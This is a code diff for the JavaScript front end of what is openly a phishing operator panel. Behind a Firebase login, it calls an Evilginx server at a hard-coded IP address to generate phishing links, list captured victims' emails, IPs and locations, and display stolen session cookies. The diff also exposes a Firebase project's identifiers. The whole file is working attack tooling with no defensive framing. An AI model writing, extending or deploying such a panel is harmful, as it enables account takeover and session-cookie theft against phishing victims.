@@ -4,57 +4,76 @@ const firebaseConfig = {
     projectId: "panel-auth-134b7",
     storageBucket: "panel-auth-134b7.firebasestorage.app",
     messagingSenderId: "892746068340",
-    appId: "Y1:892746068340:web:f8c4d5b798e8bc48447c21"
+    appId: "1:892746068340:web:f8c4d5b798e8bc48447c21"
 };
 
 firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 
-auth.onAuthStateChanged(user => {
-    if (!user) {
-        window.location.href = "index.html";
-    }
-});
+const EVILGINX_SERVER = "http://3.149.242.245:5000"; // Replace with your Evilginx IP
 
-function generateLink() {
-    fetch("http://YOUR_EVILGINX_SERVER/api/generate-link")
-        .then(response => response.json())
-        .then(data => {
-            document.getElementById("content").innerHTML = `<p>Generated Link: <a href="${data.link}" target="_blank">${data.link}</a></p>`;
+function login() {
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+    
+    auth.signInWithEmailAndPassword(email, password)
+        .then(() => {
+            window.location.href = "dashboard.html";
         })
-        .catch(error => console.error("Error generating link:", error));
-}
-
-function loadCapturedSessions() {
-    fetch("http://YOUR_EVILGINX_SERVER/api/captured-sessions")
-        .then(response => response.json())
-        .then(data => {
-            let html = "<h3>Captured Sessions</h3><table><tr><th>Email</th><th>IP</th><th>Time</th></tr>";
-            data.sessions.forEach(session => {
-                html += `<tr><td>${session.email}</td><td>${session.ip}</td><td>${session.time}</td></tr>`;
-            });
-            html += "</table>";
-            document.getElementById("content").innerHTML = html;
-        })
-        .catch(error => console.error("Error loading sessions:", error));
-}
-
-function loadCookies() {
-    fetch("http://YOUR_EVILGINX_SERVER/api/cookies")
-        .then(response => response.json())
-        .then(data => {
-            let html = "<h3>Cookies</h3><table><tr><th>Name</th><th>Value</th></tr>";
-            data.cookies.forEach(cookie => {
-                html += `<tr><td>${cookie.name}</td><td>${cookie.value}</td></tr>`;
-            });
-            html += "</table>";
-            document.getElementById("content").innerHTML = html;
-        })
-        .catch(error => console.error("Error loading cookies:", error));
+        .catch(error => {
+            document.getElementById("loginError").innerText = error.message;
+        });
 }
 
 function logout() {
     auth.signOut().then(() => {
         window.location.href = "index.html";
     });
+}
+
+function generatePhishingLink() {
+    fetch(`${EVILGINX_SERVER}/generate_link`, { method: "POST" })
+    .then(response => response.json())
+    .then(data => {
+        if (data.link) {
+            document.getElementById("generatedLink").innerText = `Phishing Link: ${data.link}`;
+        } else {
+            alert("Failed to generate link.");
+        }
+    })
+    .catch(error => console.error("Error generating link:", error));
+}
+
+function fetchCapturedSessions() {
+    fetch(`${EVILGINX_SERVER}/sessions`)
+    .then(response => response.json())
+    .then(data => {
+        let sessionTable = document.getElementById("capturedSessions");
+        sessionTable.innerHTML = "<tr><th>Email</th><th>IP</th><th>Time</th><th>Location</th></tr>";
+        data.sessions.forEach(session => {
+            sessionTable.innerHTML += `<tr>
+                <td>${session.email}</td>
+                <td>${session.ip}</td>
+                <td>${session.time}</td>
+                <td>${session.location}</td>
+            </tr>`;
+        });
+    })
+    .catch(error => console.error("Error fetching sessions:", error));
+}
+
+function fetchCookies() {
+    fetch(`${EVILGINX_SERVER}/cookies`)
+    .then(response => response.json())
+    .then(data => {
+        let cookiesTable = document.getElementById("cookiesTable");
+        cookiesTable.innerHTML = "<tr><th>Session ID</th><th>Cookie Data</th></tr>";
+        data.cookies.forEach(cookie => {
+            cookiesTable.innerHTML += `<tr>
+                <td>${cookie.session_id}</td>
+                <td>${cookie.cookie_data}</td>
+            </tr>`;
+        });
+    })
+    .catch(error => console.error("Error fetching cookies:", error));
 }
